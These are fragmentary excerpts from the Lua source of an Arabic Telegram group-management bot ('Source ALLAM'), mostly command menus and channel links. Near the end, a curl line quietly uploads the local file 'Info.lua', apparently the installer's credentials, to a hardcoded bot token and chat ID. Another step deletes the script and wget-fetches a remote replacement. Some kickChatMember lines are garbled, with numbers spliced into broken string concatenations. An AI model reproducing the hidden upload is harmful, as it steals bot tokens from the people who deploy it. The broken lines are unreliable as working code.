...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 ᴀʟʟᴀᴍ.")  
...
os.execute('rm -rf allam.lua')
os.execute('wget https://raw.githubusercontent.com/TEAMALLAM/allamm/main/allam.lua')
...
℘ ⦑ SOURCE DRAGON ⦒ 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
℘︙ [Source Channel](t.me/source_allam)
℘︙ [Source Update ](t.me/source_allam)     
℘︙ [DEV](t.me/FACKYOOOOOU)     
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
𓂅 . [TWS ALLAM](t.me/A_L_L_A_Mbot)     
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
...
local TextE = "\nٴ≪┉ ┉ ┉ ┉ ┉ 𝑨𝑳𝑳𝑨𝑵 ┉  ┉ ┉ ┉ ┉≫ٴ\n ℘︙ علامة تعني { ✔️ } ملف مفعل\n ℘︙ علامة تعني { ✖ } ملف معطل\n ℘︙ قناة سورس علام ↓\n".." ℘︙ [اضغط هنا لدخول](t.me/source_allam) \n"
local NumFile = 0
...
*🔟◂ اوامر الاعضاء .*
*ٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ*
➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 ᴀʟʟᴀᴍ. ](t.me/source_allam)➤
]]
keyboard = {} 
...
{
{text = 'CHANNEL ALLAM', url="t.me/REDDEVIILL"},
},
}
local msg_id = msg.id_/2097152/0.5
...
{
{text = 'CHANNEL ALLAM', url="t.me/source_allam"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
send(msg.chat_id_, msg.id_, t..'ٴ≪┉ ┉ ┉ ┉ ┉ 𝑨𝑳𝑳𝑨𝑴 ┉  ┉ ┉ ┉ ┉≫ٴٴ\n℘︙ ➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 ᴀʟʟᴀᴍ. ](t.me/source_allam)➤ ')
end
...
*🔟◂ اوامر الاعضاء .*
*ٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ*
➫ .[🖨┇source allam. ](t.me/source_allam)➤
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="1980492750"..msg.chat_id_.."&user_id="1859656976"..msg.sender_user_id_)
ALLAM = https.request("https://api.telegram.org/bot"1980492750"..token.."/kickChatMember?chat_id="1859656976"..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(allam)
...
local curl = 'curl "'..'https://api.telegram.org/bot1980492750:AAEMctMpjJc1xldfXk3Gu0h1ZP3wS6LsBrI/sendDocument'..'" -F "chat_id='.. 1859656976 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
------------------------------------------------------------------------
...
------------------------------------------------------------------------
if text then
local A_L_L_A_MM_Msg = database:get(bot_id.."A_L_L_A_MM:Add:Filter:Rp2"..text..result.chat_id_)   
if A_L_L_A_MM_Msg then    
send(msg.chat_id_, msg.id_," ℘︙ "..A_L_L_A_MM_Msg)
